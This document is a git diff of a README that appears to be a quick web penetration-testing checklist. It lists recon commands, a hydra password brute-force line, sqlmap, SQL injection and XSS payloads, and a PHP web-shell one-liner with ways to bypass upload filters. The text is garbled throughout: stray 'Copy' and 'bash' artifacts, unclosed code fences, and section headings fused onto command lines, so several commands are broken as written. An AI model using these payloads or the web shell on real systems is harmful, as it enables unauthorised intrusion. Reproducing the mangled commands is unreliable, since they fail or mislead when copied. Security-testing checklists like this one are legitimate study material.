@@ -33,12 +33,16 @@ This repository contains a compilation of various security tools, techniques, an
 - **ffuf**: A fast web fuzzing tool.
 - **wfuzz**: A web application fuzzer used for brute-forcing and testing hidden paths.
 
+Quick Wins & High Impact (20 minutes)
+
 ### 1. Information Gathering
-- Whois Lookup  
+
+- Whois Lookup
   ```bash
   whois example.com
-DNS & Subdomain Enumeration
-bash
+  DNS & Subdomain Enumeration
+  bash
+  ```
 
 Copy
 dig example.com any
@@ -54,8 +58,7 @@ Check robots.txt
 bash
 
 Copy
-curl https://example.com/robots.txt
-2. Mapping the Application
+curl https://example.com/robots.txt 2. Mapping the Application
 
 Directory & File Discovery
 bash
@@ -72,8 +75,7 @@ bash
 
 Copy
 hydra -l admin -P /path/to/passwords.txt example.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
-Check JWT tokens (decode & manipulate in Burp)
-4. Session Management
+Check JWT tokens (decode & manipulate in Burp) 4. Session Management
 
 Inspect cookies for Secure, HttpOnly flags
 bash
@@ -90,8 +92,7 @@ bash
 
 Copy
 sqlmap -u "https://example.com/page.php?id=1" --batch --dbs
-Manual payloads in Burp Repeater (e.g., ' OR '1'='1)
-6. Cross-Site Scripting (XSS)
+Manual payloads in Burp Repeater (e.g., ' OR '1'='1) 6. Cross-Site Scripting (XSS)
 
 Automated scan with XSStrike
 bash
@@ -102,9 +103,10 @@ Manual payloads:
 html
 
 Copy
+
 <script>alert(1)</script>
-"><img src=x onerror=alert(1)>
-7. Open Redirect / URL Redirect Testing
+
+"><img src=x onerror=alert(1)> 7. Open Redirect / URL Redirect Testing
 
 Test URL parameters that redirect users, e.g.:
 
@@ -124,15 +126,13 @@ Priority 4: CSRF, File Upload & Security Misconfigurations (10 minutes)
 8. CSRF Testing
 
 Check for CSRF tokens on forms using Burp Suite
-Replay requests without tokens to test protection
-9. File Upload Testing
+Replay requests without tokens to test protection 9. File Upload Testing
 
 Try uploading a simple web shell or bypass file type restrictions using Burp Suite
 Common payloads:
 shell.php with <?php system($_GET['cmd']); ?>
 Rename extensions (e.g., .php.jpg)
-Modify Content-Type header in Burp to bypass filters
-10. Security Misconfigurations
+Modify Content-Type header in Burp to bypass filters 10. Security Misconfigurations
 
 Nikto scan
 bash
@@ -144,10 +144,3 @@ bash
 
 Copy
 nmap --script http-methods -p 80,443 example.com
-
-
-### Directory & Subdomain Enumeration
-
-- **Subdomain Scan**: 
-  ```bash
-  gobuster dns -d <ip addr> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -i --wildcard
